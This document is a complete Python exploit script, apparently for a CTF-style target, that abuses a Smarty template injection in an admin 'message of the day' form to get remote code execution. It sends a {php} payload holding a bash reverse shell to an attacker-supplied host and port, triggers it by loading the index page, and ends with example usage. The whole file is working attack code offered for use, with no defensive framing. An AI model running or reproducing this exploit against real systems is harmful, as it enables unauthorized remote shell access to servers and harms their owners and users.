import argparse
import requests 
import traceback
from urllib.parse import urljoin

def sstiToRce(target, session, lhost, lport):
    url = urljoin(target, "/admin/update_motd.php")
    cookies = {"PHPSESSID": session}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"message": "{php}echo `bash -c \"bash -i >& /dev/tcp/%s/%s 0>&1\"`;{/php}" % (lhost,lport)} 
    try:
        print("[*] Sending the MoTD edit request...")
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        if "Message set!" in response.text:
            print("[+] MoTD message set successfully!")
            print("[*] Triggering the RCE...")
            trgUrl = urljoin(target, "/index.php")
            try:
                print("[+] Check your listener!")
                requests.get(trgUrl, cookies=cookies)
            except Exception as e:
                print("[-] Failed to trigger the RCE: ", e)
                traceback.print_exc()
        else:
            print("[-] Failed to reset the MoTD")
    except Exception as e:
        print("[-] Failed to inject the payload: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Upload webshell to the target machine")
    parser.add_argument("target", help="Target URL (e.g, http://localhost:8080)")
    parser.add_argument("session", help="Valid admin account session token")
    parser.add_argument("lhost", help="Listener IP address")
    parser.add_argument("lport", help="Listener port")
    args = parser.parse_args()

    sstiToRce(args.target, args.session, args.lhost, args.lport)

    # Example Usage:
    # python3 smarty_ssti_rce.py http://localhost:8080 gnd8fkg0vadqu08nlsb603c306 192.168.1.5 1234

if __name__ == "__main__":
    main()
